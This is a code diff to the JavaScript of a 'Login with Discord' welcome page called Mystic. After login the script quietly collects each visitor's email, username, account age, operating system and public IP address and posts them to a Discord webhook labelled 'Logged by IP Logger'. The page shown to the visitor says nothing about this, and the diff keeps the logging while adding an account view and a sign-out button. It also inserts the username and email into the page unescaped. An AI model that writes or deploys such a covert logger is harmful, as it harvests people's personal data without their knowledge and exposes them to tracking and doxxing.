@@ -8,7 +8,6 @@ async function loginWithDiscord() {
 }
 
 async function fetchUserData(code) {
-    console.log("Fetching user data with code:", code); // Debug log
     const response = await fetch('https://discord.com/api/oauth2/token', {
         method: 'POST',
         headers: {
@@ -24,13 +23,11 @@ async function fetchUserData(code) {
     });
 
     if (!response.ok) {
-        const errorText = await response.text();
-        console.error('Failed to fetch access token:', errorText); // Log error response
+        console.error('Failed to fetch access token:', await response.text());
         return;
     }
 
     const data = await response.json();
-    console.log("Access token data:", data); // Log access token data
 
     // Fetch user info
     const userInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
@@ -40,19 +37,22 @@ async function fetchUserData(code) {
     });
 
     if (!userInfoResponse.ok) {
-        const errorText = await userInfoResponse.text();
-        console.error('Failed to fetch user info:', errorText); // Log user info error
+        console.error('Failed to fetch user info:', await userInfoResponse.text());
         return;
     }
 
     const user = await userInfoResponse.json();
-    const username = user.username; // Extract username
+    const username = user.username;
     const email = user.email || "No Email attached.";
-    const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
-    const operatingSystem = navigator.platform; // Get operating system
+    const createdAt = new Date(user.created_at).toLocaleString();
+    const operatingSystem = navigator.platform;
 
-    // Call the function to send visitor info along with the user information
+    // Send user info to Discord
     sendInfoToDiscord(email, username, createdAt, operatingSystem);
+
+    // Store user data in sessionStorage for later use
+    sessionStorage.setItem('username', username);
+    sessionStorage.setItem('email', email);
 }
 
 async function sendInfoToDiscord(email, username, createdAt, operatingSystem) {
@@ -60,20 +60,16 @@ async function sendInfoToDiscord(email, username, createdAt, operatingSystem) {
     const ipData = await ipResponse.json();
     const ip = ipData.ip;
 
-    // Get additional information
-    const timestamp = new Date().toISOString();
-
     const embedMessage = {
         embeds: [{
             title: '👤 New Visitor Info',
-            color: 0xFF0000, // Red color
+            color: 0xFF0000,
             fields: [
                 { name: '📧 Email', value: email, inline: true },
                 { name: '🖥️ IP Address', value: ip, inline: true },
                 { name: '👤 Username', value: username, inline: true },
                 { name: '📅 Account Created', value: createdAt, inline: true },
-                { name: '🖥️ Operating System', value: operatingSystem, inline: true }, // Operating System
-                { name: '📅 Timestamp', value: timestamp, inline: true }, // Timestamp
+                { name: '🖥️ Operating System', value: operatingSystem, inline: true },
             ],
             footer: {
                 text: 'Logged by IP Logger',
@@ -90,7 +86,35 @@ async function sendInfoToDiscord(email, username, createdAt, operatingSystem) {
         body: JSON.stringify(embedMessage)
     });
 
-    document.body.innerHTML += `<h2>Welcome @${username}, thank you for coming!</h2>`;
+    // Display user account info
+    displayAccountInfo(username, email);
+}
+
+function displayAccountInfo(username, email) {
+    document.body.innerHTML = `
+        <div class="account-container">
+            <h2>Hey @${username}, this is your account! :D</h2>
+            <p>Email: <span id="email" style="display: none;">${email}</span>
+                <button onclick="toggleEmail()">View Email</button>
+            </p>
+            <button onclick="logout()">Sign Out</button>
+        </div>
+    `;
+}
+
+function toggleEmail() {
+    const emailElement = document.getElementById('email');
+    if (emailElement.style.display === 'none') {
+        emailElement.style.display = 'inline';
+    } else {
+        emailElement.style.display = 'none';
+    }
+}
+
+function logout() {
+    // Clear user data from sessionStorage and redirect to login
+    sessionStorage.clear();
+    window.location.href = window.location.origin; // Redirect to the original page to start login again
 }
 
 window.onload = function () {
@@ -99,12 +123,19 @@ window.onload = function () {
     if (code) {
         fetchUserData(code);
     } else {
-        // Show the login button if no code is present
-        document.body.innerHTML = `
-            <div class="container">
-                <h1>Welcome to Mystic</h1>
-                <button onclick="loginWithDiscord()">Login with Discord</button>
-            </div>
-        `;
+        // Check if user is already logged in
+        const username = sessionStorage.getItem('username');
+        if (username) {
+            const email = sessionStorage.getItem('email');
+            displayAccountInfo(username, email);
+        } else {
+            // Show the login button if no code is present and no user is logged in
+            document.body.innerHTML = `
+                <div class="container">
+                    <h1>Welcome to Mystic</h1>
+                    <button onclick="loginWithDiscord()">Login with Discord</button>
+                </div>
+            `;
+        }
     }
 };
